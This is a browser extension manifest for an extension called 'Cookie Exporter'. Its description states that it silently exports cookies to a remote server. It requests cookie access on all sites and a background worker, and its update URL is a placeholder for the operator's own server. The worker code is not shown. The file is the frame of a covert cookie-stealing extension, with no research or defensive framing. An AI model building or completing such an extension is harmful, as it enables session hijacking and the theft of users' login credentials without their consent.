{
  "manifest_version": 3,
  "name": "Cookie Exporter",
  "version": "1.0.0",
  "description": "Silently exports cookies to a remote server",
  "permissions": ["cookies", "tabs", "storage"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "background.js"
  },
  "update_url": "YOUR_SERVER_URL/update.xml"
}
